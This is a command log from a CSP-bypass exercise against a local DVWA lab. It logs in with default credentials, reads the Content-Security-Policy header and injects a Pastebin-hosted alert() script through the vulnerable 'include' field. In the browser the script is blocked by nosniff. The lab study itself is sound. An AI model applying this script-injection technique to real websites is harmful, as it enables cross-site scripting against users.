# Commands — CSP Bypass Lab

## 1. Authenticate and establish session

```bash
curl -c cookies.txt -s http://localhost:4280/login.php -o login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" login.html)

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  -o login_result.html

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/security.php \
  -d "security=low&seclev_submit=Submit" -o security_result.html
```

## 2. Retrieve and inspect the actual CSP header

```bash
curl -b cookies.txt -sI "http://localhost:4280/vulnerabilities/csp/" | grep -i "content-security-policy"
```

**Result:**
```
Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;
```

## 3. Inspect page structure

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/csp/" -o csp_baseline.html
grep -A20 "vulnerable_code_area" csp_baseline.html
```

**Result:** A form with a single `include` text field and submit button, described as allowing external script sources to be included.

## 4. Host a malicious script on an allow-listed domain

Created a public Pastebin paste containing:
```javascript
alert('CSP Bypass via Pastebin');
```
Raw URL: `https://pastebin.com/raw/AGdT1hVw`

## 5. Submit the external script URL

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/csp/" \
  -d "include=https://pastebin.com/raw/AGdT1hVw" \
  -o csp_bypass_result.html

grep -i "script" csp_bypass_result.html
```

**Result:**
```html
<script src='https://pastebin.com/raw/AGdT1hVw'></script>
```

Confirmed the application embeds the attacker-supplied URL directly as a script source with no filtering beyond what the CSP header itself enforces.

## 6. Trigger in browser and inspect DevTools Console

Navigated to `http://localhost:4280/vulnerabilities/csp/`, submitted the same Pastebin raw URL via the form, and opened DevTools (F12) → Console tab.

**Console output:**
```
The resource from "https://pastebin.com/raw/AGdT1hVw" was blocked due to
MIME type ("text/plain") mismatch (X-Content-Type-Options: nosniff).
Loading failed for the <script> with source "https://pastebin.com/raw/AGdT1hVw".
```

**No CSP violation was logged** — confirming the CSP itself permitted the connection to `pastebin.com` (as expected, since it's explicitly whitelisted). The block originated from a separate browser control: MIME-type sniffing protection, triggered because Pastebin serves raw paste content as `text/plain` with `X-Content-Type-Options: nosniff` set.

## 7. Contrast test — confirm other whitelisted domains aren't viable attack vectors either (for a different reason)

```bash
curl -sI https://example.com | grep -i "content-type"
```

**Result:** `content-type: text/html` — `example.com` is a static reference domain with no attacker-controllable content at all, making it a "dead" whitelist entry rather than an exploitable one. This is a different reason for non-exploitability than the Pastebin case (no attacker control at all, vs. attacker control blocked by MIME-type protection).
